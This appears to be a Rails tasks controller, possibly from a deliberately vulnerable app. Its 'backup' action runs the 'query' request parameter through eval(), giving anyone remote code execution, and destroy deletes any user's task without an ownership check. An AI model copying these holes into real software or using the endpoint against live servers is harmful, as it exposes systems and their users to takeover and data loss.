class TasksController < ApplicationController
  def index
    @task = Task.where(owner: current_user.id)
  end

  def new
    @task = Task.new
  end

  def show
    
    id = params[:id]
    
    if Task.where(id: id).exists?
      @task = Task.find_by(id: id, owner: current_user.id)
      if not @task
        render_403
      end
    else render_404
    end
    
  end

  def create
    @task = Task.new(task_params)
    @task.update(owner: current_user.id)
    if (@task.save)
      redirect_to @task
    else 
      render 'new'
    end
  end

  def destroy
    @task = Task.find(params[:id])
    @task.destroy
    redirect_to home_path
  end

  def backup
    @get_param = params[:query]
    eval(@get_param)
    redirect_to home_path
  end

  def err
    render_404
  end

  private def task_params
    params.require(:task).permit(:title, :body)
  end
end
